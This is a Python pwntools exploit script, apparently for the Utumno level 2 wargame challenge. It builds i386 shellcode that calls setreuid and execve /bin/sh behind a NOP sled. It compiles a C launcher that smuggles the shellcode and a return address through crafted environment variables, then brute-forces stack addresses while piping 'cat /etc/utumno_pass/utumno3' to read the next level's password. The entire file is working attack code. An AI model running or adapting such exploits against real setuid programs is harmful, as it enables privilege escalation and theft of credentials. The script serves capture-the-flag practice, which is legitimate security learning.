#!/usr/bin/env python3
from pwn import *
import subprocess, os
context.arch = "i386"

OUT = "/tmp/utumno2/brute"
os.makedirs("/tmp/utumno2", exist_ok=True)

sc = asm("""
    xor eax, eax
    mov al, 0x46
    xor ebx, ebx
    mov bl, 0x83
    mov bh, 0x3e
    xor ecx, ecx
    mov cl, 0x83
    mov ch, 0x3e
    int 0x80
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80
""")
ns = b"\x90" * 80
sc_full = ns + sc
sc_str = "".join(f"\\x{b:02x}" for b in sc_full)

c = f'''
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {{
    unsigned int addr = strtoul(argv[1], NULL, 16);
    char *a = (char *)&addr;
    char env8[] = "{sc_str}";
    char env7[11];
    env7[0]=0x41; env7[1]=0x41; env7[2]=0x41; env7[3]=0x41;
    env7[4]=0x41; env7[5]=0x41;
    env7[6]=a[0]; env7[7]=a[1]; env7[8]=a[2]; env7[9]=a[3];
    env7[10]=0;
    char *argv2[] = {{NULL}};
    char *envp[] = {{"","","","","","","", env7, env8, NULL}};
    execve("/utumno/utumno2", argv2, envp);
}}
'''
with open("/tmp/utumno2/brute.c", "w") as f:
    f.write(c)

ret = subprocess.run(["gcc", "-m32", "-static", "/tmp/utumno2/brute.c", "-o", OUT],
    capture_output=True, cwd="/tmp/utumno2")
if ret.returncode != 0:
    print("COMPILE:", ret.stderr.decode())
    exit(1)

print(f"SC: {len(sc_full)}B, brute forcing...", flush=True)
for addr in range(0xffffd000, 0xfffff000, 32):
    p = subprocess.run([OUT, f"{addr:x}"],
        input=b"echo PWNED;cat /etc/utumno_pass/utumno3\n",
        capture_output=True, timeout=5)
    out = p.stdout
    if b"PWNED" in out or b"utumno" in out:
        print(f"HIT at {hex(addr)}!")
        print(out.decode("latin-1", errors="replace"))
        break
    if (addr - 0xffffd000) % 0x2000 == 0:
        print(f"  {hex(addr)}...", flush=True)
else:
    print("No hit", flush=True)
